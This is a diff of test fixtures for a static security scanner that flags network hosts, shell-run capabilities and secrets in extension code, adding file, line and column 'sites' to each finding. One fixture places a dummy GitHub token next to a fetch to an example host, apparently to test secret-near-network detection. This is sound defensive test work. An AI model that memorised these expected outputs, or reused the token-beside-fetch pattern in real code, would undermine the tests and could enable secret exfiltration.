+        }
+       ]
       },
       {
        "host": "h129.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3374,
+         "excerpt": "example.com';'https://h128.example.com';'https://h129.example.com';'https://h130.example.com';'https://h131.example.com'"
+        }
+       ]
       },
       {
        "host": "h13.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 329,
+         "excerpt": ".example.com';'https://h12.example.com';'https://h13.example.com';'https://h14.example.com';'https://h15.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h130.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3401,
+         "excerpt": "example.com';'https://h129.example.com';'https://h130.example.com';'https://h131.example.com';'https://h132.example.com'"
+        }
+       ]
       },
       {
        "host": "h131.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3428,
+         "excerpt": "example.com';'https://h130.example.com';'https://h131.example.com';'https://h132.example.com';'https://h133.example.com'"
+        }
+       ]
       },
       {
        "host": "h132.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3455,
+         "excerpt": "example.com';'https://h131.example.com';'https://h132.example.com';'https://h133.example.com';'https://h134.example.com'"
+        }
+       ]
       },
       {
        "host": "h133.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3482,
+         "excerpt": "example.com';'https://h132.example.com';'https://h133.example.com';'https://h134.example.com';'https://h135.example.com'"
+        }
+       ]
       },
       {
        "host": "h134.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3509,
+         "excerpt": "example.com';'https://h133.example.com';'https://h134.example.com';'https://h135.example.com';'https://h136.example.com'"
+        }
+       ]
       },
       {
        "host": "h135.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3536,
+         "excerpt": "example.com';'https://h134.example.com';'https://h135.example.com';'https://h136.example.com';'https://h137.example.com'"
+        }
+       ]
       },
       {
        "host": "h136.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3563,
+         "excerpt": "example.com';'https://h135.example.com';'https://h136.example.com';'https://h137.example.com';'https://h138.example.com'"
+        }
+       ]
       },
       {
        "host": "h137.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3590,
+         "excerpt": "example.com';'https://h136.example.com';'https://h137.example.com';'https://h138.example.com';'https://h139.example.com'"
+        }
+       ]
       },
       {
        "host": "h138.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3617,
+         "excerpt": "example.com';'https://h137.example.com';'https://h138.example.com';'https://h139.example.com';'https://h140.example.com'"
+        }
+       ]
       },
       {
        "host": "h139.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3644,
+         "excerpt": "example.com';'https://h138.example.com';'https://h139.example.com';'https://h140.example.com';'https://h141.example.com'"
+        }
+       ]
       },
       {
        "host": "h14.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 355,
+         "excerpt": ".example.com';'https://h13.example.com';'https://h14.example.com';'https://h15.example.com';'https://h16.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h140.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3671,
+         "excerpt": "example.com';'https://h139.example.com';'https://h140.example.com';'https://h141.example.com';'https://h142.example.com'"
+        }
+       ]
       },
       {
        "host": "h141.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3698,
+         "excerpt": "example.com';'https://h140.example.com';'https://h141.example.com';'https://h142.example.com';'https://h143.example.com'"
+        }
+       ]
       },
       {
        "host": "h142.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3725,
+         "excerpt": "example.com';'https://h141.example.com';'https://h142.example.com';'https://h143.example.com';'https://h144.example.com'"
+        }
+       ]
       },
       {
        "host": "h143.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3752,
+         "excerpt": "example.com';'https://h142.example.com';'https://h143.example.com';'https://h144.example.com';'https://h145.example.com'"
+        }
+       ]
       },
       {
        "host": "h144.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3779,
+         "excerpt": "example.com';'https://h143.example.com';'https://h144.example.com';'https://h145.example.com';'https://h146.example.com'"
+        }
+       ]
       },
       {
        "host": "h145.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3806,
+         "excerpt": "example.com';'https://h144.example.com';'https://h145.example.com';'https://h146.example.com';'https://h147.example.com'"
+        }
+       ]
       },
       {
        "host": "h146.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3833,
+         "excerpt": "example.com';'https://h145.example.com';'https://h146.example.com';'https://h147.example.com';'https://h148.example.com'"
+        }
+       ]
       },
       {
        "host": "h147.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3860,
+         "excerpt": "example.com';'https://h146.example.com';'https://h147.example.com';'https://h148.example.com';'https://h149.example.com'"
+        }
+       ]
       },
       {
        "host": "h148.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3887,
+         "excerpt": "example.com';'https://h147.example.com';'https://h148.example.com';'https://h149.example.com';"
+        }
+       ]
       },
       {
        "host": "h149.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 3914,
+         "excerpt": "example.com';'https://h148.example.com';'https://h149.example.com';"
+        }
+       ]
       },
       {
        "host": "h15.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 381,
+         "excerpt": ".example.com';'https://h14.example.com';'https://h15.example.com';'https://h16.example.com';'https://h17.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h16.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 407,
+         "excerpt": ".example.com';'https://h15.example.com';'https://h16.example.com';'https://h17.example.com';'https://h18.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h17.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 433,
+         "excerpt": ".example.com';'https://h16.example.com';'https://h17.example.com';'https://h18.example.com';'https://h19.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h18.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 459,
+         "excerpt": ".example.com';'https://h17.example.com';'https://h18.example.com';'https://h19.example.com';'https://h20.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h19.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 485,
+         "excerpt": ".example.com';'https://h18.example.com';'https://h19.example.com';'https://h20.example.com';'https://h21.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h2.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 51,
+         "excerpt": "0.example.com';'https://h1.example.com';'https://h2.example.com';'https://h3.example.com';'https://h4.example.com';'http"
+        }
+       ]
       },
       {
        "host": "h20.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 511,
+         "excerpt": ".example.com';'https://h19.example.com';'https://h20.example.com';'https://h21.example.com';'https://h22.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h21.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 537,
+         "excerpt": ".example.com';'https://h20.example.com';'https://h21.example.com';'https://h22.example.com';'https://h23.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h22.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 563,
+         "excerpt": ".example.com';'https://h21.example.com';'https://h22.example.com';'https://h23.example.com';'https://h24.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h23.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 589,
+         "excerpt": ".example.com';'https://h22.example.com';'https://h23.example.com';'https://h24.example.com';'https://h25.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h24.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 615,
+         "excerpt": ".example.com';'https://h23.example.com';'https://h24.example.com';'https://h25.example.com';'https://h26.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h25.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 641,
+         "excerpt": ".example.com';'https://h24.example.com';'https://h25.example.com';'https://h26.example.com';'https://h27.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h26.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 667,
+         "excerpt": ".example.com';'https://h25.example.com';'https://h26.example.com';'https://h27.example.com';'https://h28.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h27.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 693,
+         "excerpt": ".example.com';'https://h26.example.com';'https://h27.example.com';'https://h28.example.com';'https://h29.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h28.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 719,
+         "excerpt": ".example.com';'https://h27.example.com';'https://h28.example.com';'https://h29.example.com';'https://h30.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h29.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 745,
+         "excerpt": ".example.com';'https://h28.example.com';'https://h29.example.com';'https://h30.example.com';'https://h31.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h3.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 76,
+         "excerpt": "1.example.com';'https://h2.example.com';'https://h3.example.com';'https://h4.example.com';'https://h5.example.com';'http"
+        }
+       ]
       },
       {
        "host": "h30.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 771,
+         "excerpt": ".example.com';'https://h29.example.com';'https://h30.example.com';'https://h31.example.com';'https://h32.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h31.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 797,
+         "excerpt": ".example.com';'https://h30.example.com';'https://h31.example.com';'https://h32.example.com';'https://h33.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h32.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 823,
+         "excerpt": ".example.com';'https://h31.example.com';'https://h32.example.com';'https://h33.example.com';'https://h34.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h33.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 849,
+         "excerpt": ".example.com';'https://h32.example.com';'https://h33.example.com';'https://h34.example.com';'https://h35.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h34.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 875,
+         "excerpt": ".example.com';'https://h33.example.com';'https://h34.example.com';'https://h35.example.com';'https://h36.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h35.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 901,
+         "excerpt": ".example.com';'https://h34.example.com';'https://h35.example.com';'https://h36.example.com';'https://h37.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h36.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 927,
+         "excerpt": ".example.com';'https://h35.example.com';'https://h36.example.com';'https://h37.example.com';'https://h38.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h37.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 953,
+         "excerpt": ".example.com';'https://h36.example.com';'https://h37.example.com';'https://h38.example.com';'https://h39.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h38.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 979,
+         "excerpt": ".example.com';'https://h37.example.com';'https://h38.example.com';'https://h39.example.com';'https://h40.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h39.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1005,
+         "excerpt": ".example.com';'https://h38.example.com';'https://h39.example.com';'https://h40.example.com';'https://h41.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h4.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 101,
+         "excerpt": "2.example.com';'https://h3.example.com';'https://h4.example.com';'https://h5.example.com';'https://h6.example.com';'http"
+        }
+       ]
       },
       {
        "host": "h40.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1031,
+         "excerpt": ".example.com';'https://h39.example.com';'https://h40.example.com';'https://h41.example.com';'https://h42.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h41.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1057,
+         "excerpt": ".example.com';'https://h40.example.com';'https://h41.example.com';'https://h42.example.com';'https://h43.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h42.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1083,
+         "excerpt": ".example.com';'https://h41.example.com';'https://h42.example.com';'https://h43.example.com';'https://h44.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h43.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1109,
+         "excerpt": ".example.com';'https://h42.example.com';'https://h43.example.com';'https://h44.example.com';'https://h45.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h44.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1135,
+         "excerpt": ".example.com';'https://h43.example.com';'https://h44.example.com';'https://h45.example.com';'https://h46.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h45.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1161,
+         "excerpt": ".example.com';'https://h44.example.com';'https://h45.example.com';'https://h46.example.com';'https://h47.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h46.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1187,
+         "excerpt": ".example.com';'https://h45.example.com';'https://h46.example.com';'https://h47.example.com';'https://h48.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h47.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1213,
+         "excerpt": ".example.com';'https://h46.example.com';'https://h47.example.com';'https://h48.example.com';'https://h49.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h48.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1239,
+         "excerpt": ".example.com';'https://h47.example.com';'https://h48.example.com';'https://h49.example.com';'https://h50.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h49.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1265,
+         "excerpt": ".example.com';'https://h48.example.com';'https://h49.example.com';'https://h50.example.com';'https://h51.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h5.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 126,
+         "excerpt": "3.example.com';'https://h4.example.com';'https://h5.example.com';'https://h6.example.com';'https://h7.example.com';'http"
+        }
+       ]
       },
       {
        "host": "h50.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1291,
+         "excerpt": ".example.com';'https://h49.example.com';'https://h50.example.com';'https://h51.example.com';'https://h52.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h51.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1317,
+         "excerpt": ".example.com';'https://h50.example.com';'https://h51.example.com';'https://h52.example.com';'https://h53.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h52.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1343,
+         "excerpt": ".example.com';'https://h51.example.com';'https://h52.example.com';'https://h53.example.com';'https://h54.example.com';'h"
+        }
+       ]
       },
       {
        "host": "h53.example.com",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 1369,
+         "excerpt": ".example.com';'https://h52.example.com';'https://h53.example.com';'https://h54.example.com';'https://h55.example.com';'h"
+        }
+       ]
       }
      ]
     },
@@ -1303,7 +2496,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -1328,7 +2521,15 @@
        "category": "local",
        "source": "frontend",
        "evidence": "commandLikeString",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/ok.js",
+         "line": 1,
+         "col": 1,
+         "excerpt": "'git status --short'"
+        }
+       ]
       }
      ],
      "dynamic": {
@@ -1379,7 +2580,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "universal",
@@ -1403,7 +2604,15 @@
       {
        "host": "bytes.example.net",
        "source": "frontend",
-       "count": 1
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/b.js",
+         "line": 1,
+         "col": 34,
+         "excerpt": "var a = '�� broken utf-8'; fetch('https://bytes.example.net')"
+        }
+       ]
       }
      ]
     },
@@ -1450,7 +2659,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "darwin-arm64",
@@ -1470,7 +2679,8 @@
        "category": "remoteWrite",
        "source": "backend",
        "evidence": "commandLikeString",
-       "files": 1
+       "files": 1,
+       "sites": []
       },
       {
        "executable": "git",
@@ -1478,7 +2688,15 @@
        "category": "remoteWrite",
        "source": "frontend",
        "evidence": "callSite",
-       "files": 1
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 1,
+         "col": 31,
+         "excerpt": "invoke('shell.run', {command: 'git push origin main'})"
+        }
+       ]
       }
      ],
      "dynamic": {
@@ -1491,7 +2709,8 @@
       {
        "host": "api.example.com",
        "source": "backend",
-       "count": 1
+       "count": 1,
+       "sites": []
       }
      ]
     },
@@ -1503,11 +2722,20 @@
     "capabilities": [
      {
       "address": "fs.writeFile",
-      "source": "backend"
+      "source": "backend",
+      "sites": []
      },
      {
       "address": "shell.run",
-      "source": "frontend"
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 1,
+        "col": 8,
+        "excerpt": "invoke('shell.run', {command: 'git push origin main'})"
+       }
+      ]
      }
     ],
     "code": {
@@ -1560,7 +2788,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "linux-arm64",
@@ -1580,7 +2808,8 @@
        "category": "remoteWrite",
        "source": "backend",
        "evidence": "commandLikeString",
-       "files": 1
+       "files": 1,
+       "sites": []
       }
      ],
      "dynamic": {
@@ -1593,7 +2822,8 @@
       {
        "host": "api.example.com",
        "source": "backend",
-       "count": 1
+       "count": 1,
+       "sites": []
       }
      ]
     },
@@ -1605,7 +2835,8 @@
     "capabilities": [
      {
       "address": "fs.writeFile",
-      "source": "backend"
+      "source": "backend",
+      "sites": []
      }
     ],
     "code": {
@@ -1652,7 +2883,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "win32-x64",
@@ -1672,7 +2903,8 @@
        "category": "remoteWrite",
        "source": "backend",
        "evidence": "commandLikeString",
-       "files": 1
+       "files": 1,
+       "sites": []
       }
      ],
      "dynamic": {
@@ -1685,7 +2917,8 @@
       {
        "host": "api.example.com",
        "source": "backend",
-       "count": 1
+       "count": 1,
+       "sites": []
       }
      ]
     },
@@ -1697,7 +2930,8 @@
     "capabilities": [
      {
       "address": "fs.writeFile",
-      "source": "backend"
+      "source": "backend",
+      "sites": []
      }
     ],
     "code": {
@@ -1743,7 +2977,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "darwin-arm64",
@@ -1763,7 +2997,8 @@
        "category": "remoteWrite",
        "source": "backend",
        "evidence": "commandLikeString",
-       "files": 1
+       "files": 1,
+       "sites": []
       }
      ],
      "dynamic": {
@@ -1776,7 +3011,8 @@
       {
        "host": "api.example.com",
        "source": "backend",
-       "count": 1
+       "count": 1,
+       "sites": []
       }
      ]
     },
@@ -1788,7 +3024,8 @@
     "capabilities": [
      {
       "address": "fs.writeFile",
-      "source": "backend"
+      "source": "backend",
+      "sites": []
      }
     ],
     "code": {
@@ -1835,7 +3072,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "linux-x64",
@@ -1907,7 +3144,7 @@
     "schemaVersion": 1,
     "scanner": {
      "id": "navide-static-scan",
-     "version": "1.0.0"
+     "version": "1.2.0"
     },
     "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
     "target": "darwin-arm64",
@@ -1931,7 +3168,8 @@
       {
        "host": "cdn.example.org",
        "source": "backend",
-       "count": 1
+       "count": 1,
+       "sites": []
       }
      ]
     },
@@ -1943,7 +3181,8 @@
     "capabilities": [
      {
       "address": "shell.run",
-      "source": "backend"
+      "source": "backend",
+      "sites": []
      }
     ],
     "code": {
@@ -1962,6 +3201,171 @@
       "embeddedRuntime": null
      }
     ]
+   }
+  },
+  {
+   "name": "finding-sites",
+   "target": "universal",
+   "manifest": {
+    "schemaVersion": 2,
+    "id": "acme.scoped",
+    "version": "1.0.0",
+    "publisher": "acme"
+   },
+   "files": {
+    "frontend/a.js": {
+     "text": "// line 1\r\n  const a = 'https://many.example.com/1';\n\n\tfetch(\"https://many.example.com/2\")\nx('https://many.example.com/3'); y('https://many.example.com/4')\ninvoke('shell.run', {\n  command:\n    'git push'\n})\nz = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;z = 1;const far = 'https://far.example.com/' + 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww'"
+    },
+    "frontend/b.js": {
+     "text": "'https://many.example.com/0'; 😀😀 invoke('storage.get', {key: 'k'})"
+    },
+    "frontend/c.js": {
+     "textParts": [
+      "const k = '",
+      "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "'",
+      "                                                                                                                                                      ",
+      "; fetch('https://near-secret.example.com/')"
+     ]
+    }
+   },
+   "expected": {
+    "schemaVersion": 1,
+    "scanner": {
+     "id": "navide-static-scan",
+     "version": "1.2.0"
+    },
+    "artifactDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+    "target": "universal",
